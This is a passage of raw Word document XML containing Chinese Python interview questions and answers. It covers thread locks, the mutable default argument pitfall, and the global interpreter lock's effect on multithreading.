        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>20</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> i </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> range(1000000):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B33371" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>21</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>global</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> g_num</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C966E4" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>22</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         g_num += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297D27CC" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>23</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>"sum2:"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, g_num)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416C9753" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>24</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 释放锁</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF6194D" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>25</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     lock.release()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65358A1E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>26</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800080"/>
        </w:rPr>
        <w:t>__name__</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> == </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="800000"/>
        </w:rPr>
        <w:t>'__main__'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52009782" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>27</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 创建两个线程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC144AB" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>28</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     first_thread = threading.Thread(target=sum_num1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40744A49" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>29</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     second_thread = threading.Thread(target=sum_num2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4852973B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>30</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t># 启动线程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23807B91" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>31</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     first_thread.start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14362038" w14:textId="3AD89F26" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>32</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     second_thread.start()    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5B628F" w14:textId="70FE5304" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00E56594"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017</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>写出代码的结果</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE0F1AD" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>def</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> f(x, l=[]):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A438A4" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> i </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> range(x):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="651DA74B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">         l.append(i*i)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DA7DF88" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(l)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C3744D6" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> f(2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F58BD2E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> f(3, [3,2,1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5E55DE" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> f(3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C87980" w14:textId="72A85F6E" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> 8</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5CD8AB" w14:textId="20982CD1" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> [0, 1] [3,2,1,0,1,4] [0,1,0,1,4] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8320F9" w14:textId="185A099C" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00E56594"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018</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>描述</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Python GIL</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的概念，以及它对</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>python</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>多线程的影响</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5794AD5F" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>1.全局解释锁。每个线程在执行的过程都需要先获取GIL，保证同一时刻只有一个线程可以执行代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DCC0933" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>2.python语言和GIL并没有关系，是由于历史原因在Cpython解释器中难以移除GIL。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A43E9F5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>3.线程释放GIL锁的情况：在IO操作等可能引起阻塞的系统调用之前，可以暂时释放GIL，cpu会切换执行其他线程，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1789D4C1" w14:textId="3F325DC3" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>但在执行完毕后，必须重新获取GIL。python3使用计时器（执行时间达到阈值后，当前线程释放GIL）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB3A0E5" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>如何解决GIL问题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F302E30" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>1.换解释器，默认是Cpython，可以换成jpython</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4668955E" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>2.使用其他语言写其他线程。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35371E40" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>3.进程+协程</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9054B2" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>结论：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="220DE32B" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>1.Python使用多进程可充分利用多核cpu的资源</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D0AC6F" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>2.多线程爬取比单线程性能有提升，因为遇到IO阻塞会自动释放GIL锁。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2573E090" w14:textId="77777777" w:rsidR="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>为什么有了GIL锁多线程使用时还要使用互斥锁：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24CB1C4B" w14:textId="23BF4418" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A63022" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>GIL锁不能保证一个线程是否执行完成，互斥锁可以保证一个线程执行完成之后解锁，让别的程序再加锁执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F09348D" w14:textId="4D15AD9A" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00E56594"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019</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>一行实现对列表</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
